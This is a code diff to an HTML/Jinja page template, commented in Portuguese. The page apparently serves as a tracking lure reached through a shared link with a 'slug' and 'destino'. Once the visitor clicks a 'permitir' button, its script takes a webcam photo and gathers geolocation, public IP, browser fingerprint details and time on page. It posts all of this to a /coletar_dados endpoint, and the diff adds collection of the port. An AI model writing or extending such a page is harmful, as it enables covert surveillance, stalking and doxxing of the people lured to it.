@@ -112,7 +112,7 @@
     const slug = {{ slug | tojson | safe }};
     const destino = {{ destino | tojson | safe }};
     const inicioTempo = Date.now();
-
+  
     const coletarInfoBrowser = async () => {
       const userAgent = navigator.userAgent;
       const idioma = navigator.language;
@@ -121,7 +121,8 @@
       const alturaTela = window.screen.height;
       const plataforma = navigator.platform;
       const conexao = (navigator.connection || {}).effectiveType || "indisponível";
-
+      const porta = location.port || (location.protocol === "https:" ? "443" : "80");
+  
       let ip = "indefinido";
       try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -130,7 +131,7 @@
       } catch (e) {
         console.warn("IP não obtido:", e);
       }
-
+  
       return {
         userAgent,
         idioma,
@@ -139,14 +140,15 @@
         alturaTela,
         plataforma,
         conexao,
-        ip
+        ip,
+        porta
       };
     };
-
+  
     const coletarDados = async () => {
       document.getElementById("loading").style.display = "block";
       let latitude = "", longitude = "", foto_base64 = "";
-
+  
       try {
         const pos = await new Promise((res, rej) =>
           navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 }));
@@ -155,28 +157,28 @@
       } catch (e) {
         console.warn("Geolocalização negada ou falhou.");
       }
-
+  
       try {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
+  
         video.srcObject = stream;
         await new Promise(r => setTimeout(r, 2000));
-
+  
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         foto_base64 = canvas.toDataURL("image/png");
-
+  
         stream.getTracks().forEach(t => t.stop());
       } catch (e) {
         console.warn("Câmera negada ou falhou.");
       }
-
+  
       const infosBrowser = await coletarInfoBrowser();
       const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
-
+  
       const payload = {
         slug,
         latitude,
@@ -185,7 +187,7 @@
         tempoSegundos,
         ...infosBrowser
       };
-
+  
       try {
         const res = await fetch("/coletar_dados", {
           method: "POST",
@@ -199,10 +201,10 @@
         document.getElementById("mensagem").innerText = "Erro ao processar.";
       }
     };
-
+  
     document.getElementById("permitir").addEventListener("click", coletarDados);
-
-    // IP inicial
+  
+    // Captura de IP inicial (sem a porta)
     (async () => {
       try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -217,5 +219,6 @@
       }
     })();
   </script>
+  
 </body>
 </html>
